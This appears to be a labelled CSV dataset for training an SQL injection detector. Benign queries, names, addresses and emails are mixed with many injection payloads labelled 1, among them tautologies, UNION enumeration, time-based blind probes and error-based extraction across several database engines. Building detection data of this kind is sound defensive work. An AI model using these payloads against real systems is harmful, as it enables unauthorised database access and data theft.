Query,Label
select * from users where id = 1 + ( \+ ) or 1 = 1 -- 1,1
"1%"" and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"SELECT fewID AS ID, office AS massage FROM mark",0
ondorica arabia,0
SELECT third ( s FROM wool RIGHT JOIN,0
enga3ladu4a,0
"SELECT orID AS ID, it AS soft FROM directly",0
7.50908E+15,0
"1' in boolean mode ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) #",1
"1 ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 9462 = 9462",1
"1%' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
"SELECT * FROM per ORDER BY straight ASC, trail DESC",0
"SELECT pleaseID AS ID, wherever AS uncle FROM boat",0
"c/ caamaque, 15, 4-g",0
1'+ ( select uhsy where 4596 = 4596 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',1
"-4947' in boolean mode ) union all select 3314,3314#",1
93289880v,0
"c/ zumalacarregui 87,",0
0a1q45tu9rt8,0
"INSERT INTO stronger ( floating, hollow, barn, note, without, property ) VALUES ( 'discovery', 'airplane'. creature', 'composition', 'fall', 'high', 'grandfather' )",0
SELECT * FROM vowel WHERE test BETWEEN 'additional' AND 'won',0
-8328 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # rlva,1
hau,0
rattray@elgrancolisionadordehadrones.gl,0
1 ) or sleep ( 5 ) and ( 2211 = 2211,1
"1%' and make_set ( 8403 = 8403,8899 ) and '%' = '",1
SELECT therefore ( s ) FROM weak SELECT pleasant FROM radio,0
bodo,0
"or 1 = 1 or """" =",1
1' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'pehq' like 'pehq,1
"1%"" ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
l-9rn,0
"SELECT Orders.nailsrID, Employees.automobile, Employees.activity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.callID ORDER BY Orders.indeedID",0
v5llo34,0
"SELECT Employees.machine, COUNT ( Orders.grewID ) AS parallelFROM ( OrdersINNER JOIN those ON Orders.showID = Employees.propertyID )",0
"SELECT * FROM clothes WHERE father BETWEEN ""goose"" AND ""certain""",0
"1%"" ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""%"" = """,1
4.4334E+15,0
halliwil,0
"c/ de pedro vidal s/n, 11d",0
56597686e,0
"SELECT ourID AS ID, knife AS plenty FROM close",0
induracin,0
SELECT spider ( s ) FROM settlers UNION,0
SELECT TOP 3 * FROM doubt WHERE smaller = 'hidden',0
"SELECT * FROM sentence WHERE fix NOT IN ( 'threw', 'social', 'daily' )",0
SELECT TOP 3 * FROM tobacco,0
"1 ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( 1185 = 1185",1
visionario,0
31252,0
"-2929"" ) ) ) union all select 8999,8999#",1
"select pg_sleep ( 5 ) and ( ( ""qani"" = ""qani",1
louladak,0
SELECT material ( s ) FROM port SELECT automobile FROM almost,0
venancia,0
SELECT single FROM invented UNION SELECT pick FROM heading ORDER BY hospital,0
"1 ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 6578 = 6578",1
SELECT * FROM fur WHERE habit BETWEEN 'grown' AND 'reason',0
"1' in boolean mode ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) #",1
"c/ alcaices, 23",0
distar,0
"1"" ) as oijn where 1521 = 1521 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
1 ) as qkkm where 8461 = 8461,1
"INSERT INTO come ( rabbit, separate, full ) VALUES ( 'government', 'using', 'hard' )",0
51517640d,0
kwokchoi,0
"select * from users where id = 1 <@&@ union select 1,version ( ) -- 1",1
1' ) and sleep ( 5 ) and ( 'xecl' like 'xecl,1
-4410 where 5749 = 5749 or 1317 = 9823--,1
"SELECT * FROM Customers WHERE Country IN ( 'Germany', 'France', 'UK' ) ;",0
1%' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( '%' = ',1
SELECT * FROM important WHERE hour = 'increase' LIMIT 3,0
"INSERT INTO actually ( sides, year, recognize ) VALUES ( 'gravity', 'use', 'thumb' )",0
"1%"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""%"" = """,1
SELECT * FROM place,0
v9n939z6,0
"1 ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( 3950 = 3950",1
"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'lxoc' = 'lxoc",1
calle bertran de castellet 28 6e,0
takakura@cenitsoria.sb,0
select case when 7634 = 3954 then 1 else null end--,1
SELECT * FROM ( SELECT broad FROM pig ),0
SELECT * FROM paragraph ORDER BY prevent,0
"1 where 8908 = 8908 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
SELECT COUNT ( regular ) FROM clean,0
-2129' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'eutm' like 'eutm,1
""" or """"&""",1
"SELECT * FROM announced WHERE health BETWEEN ""yourself"" AND ""that""",0
SELECT * FROM metal WHERE trouble BETWEEN 'constantly' AND 'alike',0
1 ) as ratg where 3033 = 3033 union all select null--,1
1 where 8506 = 8506,1
"SELECT soap, home, distance FROM may WHERE saved IS NULL",0
ecija 51 12-h,0
SELECT * FROM lift WHERE football = 'strong' OR threw = 'depend',0
ip50,0
"( extractvalue ( 1759,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1759 = 1759,1 ) ) ) ,0x717a767a71 ) ) )",1
6.8623E+15,0
"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'adsh' = 'adsh",1
SELECT * FROM sister WHERE NOT themselves = 'hurried' AND NOT control = 'stay',0
select ( case when ( 3486 = 6373 ) then 3486 else 3486* ( select 3486 from mysql.db ) end ) #,1
"1%"" ) ) ) union all select null,null,null,null,null#",1
"1' where 7688 = 7688 union all select null,null,null,null,null,null,null,null,null--",1
"select * from users where id = 1 or "" ) @"" or 1 = 1 -- 1",1
1' ) rlike sleep ( 5 ) #,1
"calle miguel lopez de legazpi, 48, 8f",0
"1%' ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( '%' = '",1
"SELECT * FROM equipment ORDER BY rhythm, least",0
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",1
"-7006' where 6966 = 6966 union all select 6966,6966,6966,6966#",1
"1%"" and 7533 = 7533 and ""%"" = """,1
"1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""hiwo"" like ""hiwo",1
SELECT * FROM individual WHERE slip BETWEEN 10 AND 20,0
torcuarto,0
brian,0
"1%' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( '%' = '",1
cebuano,0
1' ) ) as kdse where 6767 = 6767 rlike sleep ( 5 ) #,1
7.66646E+15,0
cobo,0
"-9171 ) union all select 6880,6880,6880,6880,6880,6880,6880#",1
SELECT TOP 50 PERCENT * FROM kept,0
SELECT population ( s ) FROM star INNER JOIN,0
SELECT * FROM remove WHERE pool IN ( SELECT one FROM phrase ),0
"c/ mineria, 151 13?g",0
eyre9@ringringcargo.tn,0
"1%"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""%"" = """,1
SELECT AVG ( dust ) FROM dot,0
"-5924' where 5415 = 5415 union all select 5415,5415,5415,5415,5415,5415#",1
"1' ) where 7391 = 7391 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1
"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 'cogk' = 'cogk",1
select ( case when ( 8642 = 6049 ) then 1 else 8642* ( select 8642 from master..sysdatabases ) end ) --,1
SELECT * FROM difficult ORDER BY neighbor,0
"1"" ) ) ) union all select null,null,null,null,null,null#",1
tiberio,0
SELECT * FROM slight WHERE NOT tales = 'arrive',0
"SELECT COUNT ( triangle ) , again FROM fruit BY large",0
"SELECT column_name ( s ) FROM rule,bat",0
"1"" ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""zyeo"" like ""zyeo",1
SELECT * FROM principal WHERE case = 'poor',0
vilcu-verschuer@eddydaniele.kz,0
"1' ) and elt ( 4249 = 4249,7259 ) and ( 'ifca' like 'ifca",1
"1%"" ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
"1' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'dfxd' like 'dfxd",1
"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1
SELECT * FROM Customers WHERE Country = 'Germany' LIMIT 3;,0
SELECT frighten ( s ) FROM test UNION,0
siefert,0
detlefsen albornoz,0
FROM ( SELECT DISTINCT mile FROM introduced ),0
SELECT * FROM news WHERE again NOT LIKE 'important%',0
SELECT * FROM floating WHERE magic NOT BETWEEN 'worse' AND 'conversation',0
DELETE FROM clothes WHERE string = 'sail',0
SELECT * FROM became WHERE term BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM paint WHERE century BETWEEN 'change' AND 'selection',0
"1' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
"SELECT magic, replace, shoulder FROM hurt WHERE fierce IS NULL",0
SELECT lost ( s ) FROM structure FULL OUTER JOIN,0
"calle daniel florido rodriguez, 105, 2?f",0
phan,0
SELECT * FROM name 3 SELECT * FROM pocket,0
"1%"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1
SELECT * FROM myself WHERE effort BETWEEN 'yet' AND 'diagram',0
"-4860' ) as azyx where 6901 = 6901 union all select 6901,6901,6901,6901,6901#",1
) or ( a = a,1
"1"" ) ) ) union all select null,null--",1
"calle camino getafe, 157,",0
"-3270"" where 2144 = 2144 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1
"select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1",1
SELECT satisfied ( s ) FROM library SELECT get FROM fence,0
"-6294"" union all select 9921,9921,9921,9921,9921,9921--",1
crisp vivo,0
"SELECT * FROM laugh ORDER BY until ASC, grandmother DESC",0
1 ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 6406 = 6406,1
"1"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""ikaf"" like ""ikaf",1
"1%"" ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
7.91264E+15,0
1'|| ( select 'vasx' where 4770 = 4770 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||',1
"SELECT * FROM glass WHERE topic NOT IN ( 'tell', 'mouth', 'typical' )",0
furnari pentinat,0
SELECT AVG ( load ) FROM mountain SELECT SUM ( write ),0
1'|| ( select 'kzkr' from dual where 2778 = 2778,1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""ulfr"" like ""ulfr",1
end and ( ( 'vkle' = 'vkle,1
4.23439E+15,0
"-3758' ) ) union all select 9460,9460,9460,9460,9460,9460,9460,9460--",1
"1'+ ( select 'iyvn' where 9358 = 9358 or elt ( 6272 = 6272,sleep ( 5 ) ) ) +'",1
1 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) # cykf,1
aprea@ingenelec.es,0
SELECT * FROM beginning,0
"-3828%"" ) ) ) or make_set ( 1765 = 8657,8657 ) and ( ( ( ""%"" = """,1
wakefiel7,0
"1"" ) where 1699 = 1699 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
1 ) or sleep ( 5 ),1
SELECT * FROM chain,0
SELECT TOP 3 * FROM airplane WHERE president = 'hollow' SELECT * FROM tube,0
mariabel,0
SELECT * FROM handsome WHERE die LIKE '%race%',0
SELECT * FROM very WHERE yard = 'glass' OR couple = 'however',0
"1%"" ) ) and elt ( 7633 = 4110,4110 ) and ( ( ""%"" = """,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 9053 ) ORDER BY meta_id ASC",0
"1' ) ) as peeo where 5356 = 5356 and elt ( 4722 = 2382,2382 ) --",1
"select * from users where id = '1' or @ @1 = 1 union select 1,version ( ) -- 1'",1
SELECT * FROM milk WHERE shelter = 'happy' FETCH FIRST 3 ROWS ONLY,0
"1'|| ( select 'qsgi' where 1707 = 1707 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",1
"SELECT POWER ( 8, 3 ) ;",0
"1"" ) ) ) union all select null,null,null,null,null,null,null,null--",1
pembrooke_coates@stainless.gd,0
"1 union all select null,null#",1
rougerie@cincocolores.sd,0
"UPDATE original SET what = 'who', City = 'exciting' WHERE congress = against",0
5.5366E+15,0
SELECT * FROM ice WHERE week = 'which' AND City = 'arm',0
demoniaca,0
1 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) # mekk,1
admin' or 1 = 1/*,1
giovannina,0
"1' in boolean mode ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",1
5988,0
olaughlin@pinkplanetplasencia.uy,0
-5852 ) as anca where 3574 = 3574 or 3958 = 5536#,1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( 'xmwj' = 'xmwj",1
"1"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1
SELECT face FROM captured UNION SELECT environment FROM night ORDER BY frequently,0
"1"" ) ) union all select null,null,null,null,null,null,null,null,null,null--",1
"1"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""fpqh"" = ""fpqh",1
"1%"" ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
SELECT plane FROM require,0
"SELECT * FROM heart ORDER BY lucky ASC, comfortable DESC",0
-3867%' ) or 3084 = 5633 and ( '%' = ',1
1'|| ( select 'awic' where 5227 = 5227,1
"INSERT INTO more ( relationship, why, hand ) VALUES ( 'empty', 'expect', 'war' )",0
1 ) where 9160 = 9160,1
SELECT Count ( * ) AS drive,0
SELECT * FROM burst WHERE voyage = 'period' OR sign = 'poetry',0
alh4a3,0
25254382z,0
"1' ) where 8948 = 8948 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
SELECT religious FROM vegetable UNION ALL SELECT again FROM paper ORDER BY dark,0
cal5br2,0
SELECT * FROM record WHERE connected LIKE '%inch%',0
chao-pin2,0
"UPDATE gun SET hungry = 'chair', City = 'screen' WHERE slow = melted",0
c0m51ar,0
"1"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""oxxi"" = ""oxxi",1
1' where 5547 = 5547,1
madrigal puigb,0
"1"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",1
valcarcel,0
SELECT * FROM ( SELECT everybody FROM would ),0
66,0
"1"" ) as zovk where 4591 = 4591 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1
"1"" ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""sfbc"" = ""sfbc",1
"calle 300 al 8 del km. 1 puesta en riego 144,",0
"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) -- uslt",1
3.24363E+15,0
"1%' union all select null,null,null,null,null,null,null,null,null,null#",1
"1' ) ) union all select null,null,null,null,null,null,null#",1
SELECT * FROM sport 3 SELECT * FROM southern,0
"-2872 ) where 8797 = 8797 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
"SELECT got,author FROM might WHERE sand = 'journey' UNION SELECT including, hard FROM letter",0
d'amico urrea,0
1 ) ) ) rlike sleep ( 5 ) and ( ( ( 6790 = 6790,1
vall de ebo,0
SELECT AVG ( muscle ) FROM dangerous,0
SELECT TOP 3 * FROM food WHERE begun = 'careful' SELECT * FROM milk,0
SELECT river ( s ) FROM laugh SELECT combine FROM increase,0
SELECT * FROM old FETCH FIRST 50 PERCENT ROWS ONLY,0
1' ) and 2577 = 7094,1
"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",1
1.1363E+15,0
"1"" ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""nrhz"" like ""nrhz",1
SELECT TOP 3 * FROM CustomersWHERE Country = 'Germany';,0
"SELECT transportation, older+ ', ' + traffic+ ' ' + surprise+ ', ' + simple AS quietly FROM full",0
"1'+ ( select jqyo where 4426 = 4426 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'",1
"-4558"" or ( 3965 = 3933 ) *3933 and ""hmdb"" like ""hmdb",1
"select * from users where id = 1 or ""?@"" or 1 = 1 -- 1",1
"1' ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"-5526 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
"SELECT fought, previous, occasionally FROM without WHERE meant IS NULL",0
"silo 179, 12?b",0
SELECT pot ( s ) FROM hang SELECT know ( s ),0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f6c885367717' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"1' ) union all select null,null,null,null,null,null,null,null,null#",1
"1%"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
vai@sexplorador.mk,0
"1 ) ) as avdz where 1881 = 1881 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"1' ) ) ) union all select null,null,null,null,null,null,null#",1
taghizad,0
"SELECT INSTR ( ""W3Schools.com"", ""3"" ) AS MatchPosition;",0
SELECT DISTINCT fifth FROM bar,0
1'|| ( select 'dezl' where 8661 = 8661,1
1'+ ( select 'jaok' where 2592 = 2592,1
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 'atyf' = 'atyf",1
condal talero,0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id WHERE t.term_id = 715",0
"1' ) ) ) union all select null,null,null,null#",1
SELECT COUNT ( apart ) FROM pole,0
"-4025"" or 3038 = 3038",1
SELECT whole ( s ) FROM dry UNION ALL,0
avda. fernando ferrerio s/n,0
"SELECT STR_TO_DATE ( ""August,5,2017"", ""%M %e %Y"" ) ;",0
1' ) ) rlike sleep ( 5 ) and ( ( 'qitl' like 'qitl,1
select ( case when ( 1407 = 2741 ) then 1407 else 1407* ( select 1407 from mysql.db ) end ) #,1
leni,0
1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'ljhc' = 'ljhc,1
"SELECT Employees.visitor, COUNT ( Orders.purposeID ) AS shallowFROM ( OrdersINNER JOIN hung ON Orders.policemanID = Employees.recentID )",0
san perfecto 8,0
"SELECT Orders.touchrID, Employees.frighten, Employees.lead FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.caughtID ORDER BY Orders.fliesID",0
4364,0
"1"" ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
SELECT DISTINCT straight FROM community,0
demonlatra,0
"SELECT noted,instrument FROM star WHERE visit = 'end' UNION SELECT you, riding FROM hardly",0
rollie,0
SELECT * FROM running WHERE song = 'window' AND ( deeply = 'slight' OR exciting = 'sale' ),0
"1 ) as jvuo where 6859 = 6859 union all select null,null,null,null,null,null,null#",1
SELECT * FROM hollow,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 13506 ) ORDER BY meta_id ASC",0
22120,0
avellano,0
SELECT AVG ( lift ) FROM page SELECT SUM ( mark ),0
"SELECT Orders.relationshiprID, Employees.press, Employees.natural FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.planningID ORDER BY Orders.dogID",0
"-8735' ) ) union all select 3262,3262,3262--",1
ligurs,0
"1"" and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1
"1' ) as siyk where 1514 = 1514 union all select null,null,null,null,null,null#",1
"1"" ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ""lxfm"" = ""lxfm",1
-7497' ) as kjzt where 3758 = 3758 or 4794 = 9499--,1
1' where 1652 = 1652 and sleep ( 5 ) #,1
SELECT * FROM rich,0
"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1
SELECT * FROM older WHERE wagon BETWEEN '1996-07-01' AND '1996-07-31',0
"1' where 7417 = 7417 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"select sleep ( 5 ) and ""%"" = """,1
supersticin,0
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( 'vcgc' like 'vcgc",1
"1%"" ) ) ) or sleep ( 5 ) #",1
"1%' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( '%' = '",1
SELECT * FROM forth WHERE physical NOT BETWEEN 'jump' AND 'each',0
SELECT * FROM population ORDER BY development DESC,0
57418420r,0
